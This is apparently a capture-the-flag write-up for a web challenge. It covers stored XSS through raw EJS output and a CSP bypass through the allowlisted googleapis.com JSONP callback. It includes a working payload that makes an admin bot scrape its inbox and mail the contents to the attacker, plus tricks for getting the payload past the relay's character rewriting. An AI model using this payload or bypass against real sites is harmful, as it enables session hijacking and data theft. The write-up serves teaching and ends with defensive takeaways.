# Massa Gold

| Field | Details |
|-------|---------|
| **Challenge** | Massa Gold |
| **Platform** | Cyber Apocalypse CTF 2026: The Salt Crown |
| **Category** | Web (Stored XSS + CSP bypass) |
| **Flag** | `HTB{m3554g3_1n_7h3_cu570dy_ch41n_bad9dfb6b21cae512bc17925c6d226b8}` |

---

## Overview

A medieval-themed messaging app ("sealed letters" between users). Register, send a
message to any username, and the `admin` account is visited by a headless-browser
bot whenever it receives mail: the classic self-XSS-to-admin-bot setup. The catch
is a strict CSP that blocks inline scripts, so a naive `<script>alert(1)</script>`
payload doesn't fire.

## Recon

The message body is rendered unescaped:

```ejs
<!-- app/views/message.ejs -->
<pre class="letter-copy"><%- message.content %></pre>
```

`<%- %>` is EJS's raw/unescaped output tag (`<%= %>` would HTML-encode it), so
whatever HTML we put in `content` when POSTing to `/messages` lands verbatim in
the page: stored XSS, no filtering at all.

`bot/bot.js` confirms the attack surface: any message sent to a user named
`admin` triggers `enqueueMessageVisit()`, which spins up headless Firefox, logs
in with real admin credentials read from `/app/admin_credentials.json`, and
navigates to `/messages/:id`: i.e. our payload executes in an authenticated
admin session.

```js
// app/controllers/messageController.js
if (recipient.username === 'admin') {
  enqueueMessageVisit(result.lastID);
}
```

There's no CSRF protection anywhere in `routes.js`, so once our JS runs as the
admin we can just `fetch('/messages', { method: 'POST', credentials: 'same-origin' })`
to mail ourselves whatever we find in the admin's inbox.

## The CSP wall

`server.js` sets a fairly tight policy:

```
default-src 'self';
script-src 'self' https://www.googleapis.com;
style-src 'self';
img-src 'self' data:;
connect-src 'self';
object-src 'none';
form-action 'self';
frame-ancestors 'none';
```

`script-src` has no `'unsafe-inline'`, so a plain `<script>...</script>` body
never executes: the browser drops it. But `script-src` explicitly whitelists
`https://www.googleapis.com`, and that host serves a JSONP endpoint
(`/customsearch/v1?callback=...`) that reflects the `callback` query parameter
verbatim as the start of its response body, with **no validation that it's a
legal identifier**:

```
GET https://www.googleapis.com/customsearch/v1?callback=YOUR_JS_HERE
->
YOUR_JS_HERE({ ...json error body... });
```

So `<script src="https://www.googleapis.com/customsearch/v1?callback=<code>"></script>`
is a same-origin-policy-legal, CSP-legal way to get arbitrary JS to execute,
using Google's own domain as a loader. The trailing `(...)` call against our
code's return value throws a harmless `TypeError` afterward: irrelevant,
since our code already ran during evaluation of the `callback` prefix.

## Payload: crawl admin's inbox, exfiltrate the flag

The plan:

1. `fetch('/', { credentials: 'same-origin' })`: reload the inbox as admin.
2. Scrape `/messages/(\d+)` ids out of the HTML.
3. `fetch` each `/messages/:id`, regex out anything shaped like `word{...}`.
4. POST the result to `/messages` with `to_username=<our attacker account>`.
5. Poll our own inbox from the exploit script until the admin's reply shows up.

## First attempt: "invalid escape sequence"

The first version of the payload built the exfil script normally (comparisons
like `c >= '0' && c <= '9'`), flattened newlines, URL-encoded it into the
`callback` param, and fired it at `admin`. The self-test against our *own*
account confirmed the raw `<script src="...">` tag was stored and rendered
un-escaped, so the stored-XSS half worked. But the admin bot never replied.
Polling the bot's own debug logs showed:

```
[response OK] 200 https://www.googleapis.com/customsearch/v1?callback=...
[page error] invalid escape sequence
```

Google's response *was* being fetched successfully (200 OK, CSP allowed it): the script was failing to *parse*. Fetching the exact same JSONP URL directly
and dumping the raw bytes explained why:

```js
// diagnose_jsonp.js
fetch(url).then(r => r.text()).then(text => console.log(text));
```

```
(function(){\n  function isDigit(c) { return c >= '0' && c <= '9'; }\n})()( ... )
```

Google's JSONP frontend globally rewrites every literal `<` and `>` byte
anywhere in the response: including inside the reflected `callback` code
itself: to the *literal six-character text* `<` / `>` (presumably
an XSS-hardening measure for the JSONP echo). That's fine if the character
was inside a JS string literal (where `>` is a valid unicode escape
producing `>`), but our comparisons like `c >= '0'` live in bare code, not a
string. `c >= '0'` outside a string is not valid JavaScript syntax at
all: hence Firefox's `invalid escape sequence` `SyntaxError`, which aborts
the entire `<script>` before a single line runs (including the harmless parts
before the offending comparison).

## Fix: zero `<` / `>` characters, anywhere

The only reliable fix is to make sure the payload never contains a literal
`<` or `>` byte at all, since *any* occurrence gets mangled the same way.
Character-range checks were rewritten as regexes, and numeric comparisons
were rewritten using `Math.sign`, which needs no `<`/`>` operator tokens:

```js
function lt(a, b)  { return Math.sign(a - b) === -1; }
function gte(a, b) { return Math.sign(a - b) !== -1; }

function isDigit(c)    { return /^[0-9]$/.test(c); }
function isWordChar(c) { return /^[A-Za-z0-9_]$/.test(c); }

// end < html.length        ->  lt(end, html.length)
// i >= ids.length           ->  gte(i, ids.length)
// (closeIdx - openIdx) < 200 -> lt(closeIdx - openIdx, 200)
// start > 0                 ->  gte(start, 1)
```

With every comparison rewritten this way, the JSONP round-trip no longer
mangles the payload, and it parses and executes cleanly in the admin's
Firefox session.

## Full exploit

Full script: `exploit.js`

```js
// exploit.js  (trimmed: see linked file above for the full script)
const inlinePayload = `(function(){
  function lt(a,b){ return Math.sign(a-b) === -1; }
  function gte(a,b){ return Math.sign(a-b) !== -1; }
  function report(msg){
    return fetch('/messages', {
      method: 'POST',
      credentials: 'same-origin',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: 'to_username=${attacker.username}&content=' + encodeURIComponent(msg)
    });
  }
  function isDigit(c) { return /^[0-9]$/.test(c); }
  function isWordChar(c) { return /^[A-Za-z0-9_]$/.test(c); }
  function extractIds(html) { /* scrape /messages/(\\d+) via lt()/gte() loop */ }
  function extractFlag(html) { /* find nearest {...} to a word-char run via lt()/gte() */ }
  fetch('/', { credentials: 'same-origin' })
    .then(r => r.text())
    .then(inboxHtml => {
      var ids = extractIds(inboxHtml), i = 0;
      function next() {
        if (gte(i, ids.length)) return report('NO_FLAG_FOUND');
        var id = ids[i++];
        return fetch('/messages/' + id, { credentials: 'same-origin' })
          .then(r => r.text())
          .then(html => { var f = extractFlag(html); return f ? report(f) : next(); });
      }
      return next();
    });
})()`;

const jsonpSrc = 'https://www.googleapis.com/customsearch/v1?callback=' + encodeURIComponent(inlinePayload);
const payload = `<script src="${jsonpSrc}"></script>`;

await sendMessage(attackerJar, 'admin', payload);
// poll our own inbox until admin's reply with the flag arrives
```

Run:

```bash
node exploit.js http://<target-ip>:<port>
```

```
[*] Registering attacker account: attacker_4thnu7x1
[*] Self-test message HTML contains unescaped <script> tag: true
[*] Sending XSS payload to admin (triggers admin bot visit)...
[*] Waiting for admin bot to execute payload and reply...

[+] FLAG: HTB{m3554g3_1n_7h3_cu570dy_ch41n_bad9dfb6b21cae512bc17925c6d226b8}
```

## Takeaways

- `<%- %>` in EJS is raw output: using it on user-controlled content is
  always stored XSS. `<%= %>` (HTML-escaped) should be the default; raw output
  needs a specific justification.
- A `script-src` allowlist is only as strong as the endpoints on it. Any
  whitelisted domain hosting a JSONP endpoint (or an open redirect, or an
  `Access-Control-Allow-Origin: *` script host) that reflects attacker input
  unsanitized is a full CSP bypass: `googleapis.com`'s legacy Custom Search
  JSONP endpoint is a well-known example of this.
- Don't assume a JSONP "echo the callback" endpoint reflects your payload
  byte-for-byte. Google's frontend rewrites `<`/`>` (and raw newlines) inside
  the reflected callback text as a defensive measure, which is enough to
  break arbitrary JS if you're not expecting it. When a whitelisted relay
  mangles your payload, dump its raw response bytes directly (bypassing the
  browser/CSP layer entirely) rather than debugging blind through a
  browser's console: that's what isolated the exact bytes causing the parse
  failure here.
